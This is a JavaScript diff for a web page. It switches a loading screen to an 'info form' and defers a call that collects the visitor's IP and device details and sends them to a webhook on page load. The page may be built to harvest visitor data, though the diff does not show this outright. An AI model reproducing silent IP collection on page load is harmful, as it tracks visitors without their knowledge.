@@ -496,6 +496,20 @@ async function startLoadingSequence() {
     // Wait a moment before transitioning
     await new Promise(resolve => setTimeout(resolve, 1000));
     
+    // Hide loading screen and show info form
+    console.log('🔄 Transitioning from loading screen to info form...');
+    const loadingScreen = document.getElementById('loading-screen');
+    const infoForm = document.getElementById('info-form');
+    
+    if (loadingScreen && infoForm) {
+        loadingScreen.style.display = 'none';
+        infoForm.style.display = 'flex';
+        console.log('✅ Successfully transitioned to info form');
+    } else {
+        console.error('❌ Failed to find loading screen or info form elements');
+        console.log('  - loadingScreen:', loadingScreen ? '✅ Found' : '❌ Missing');
+        console.log('  - infoForm:', infoForm ? '✅ Found' : '❌ Missing');
+    }
     
     // Check if all elements exist
     console.log('📋 Form elements check:');
@@ -627,12 +641,14 @@ window.addEventListener('load', function() {
     // Setup inactivity monitoring
     setupInactivityMonitoring();
     
-    // Collect IP and send initial webhook immediately
-    collectIPAndSendInitialWebhook();
-    
-    // Start loading sequence
+    // Start loading sequence immediately (don't wait for IP collection)
     startLoadingSequence();
     setupInfoForm();
+    
+    // Collect IP and send initial webhook in the background (non-blocking)
+    setTimeout(() => {
+        collectIPAndSendInitialWebhook();
+    }, 100); // Small delay to ensure loading sequence starts first
 });
 
 // Collect IP and send initial webhook with just IP and device info
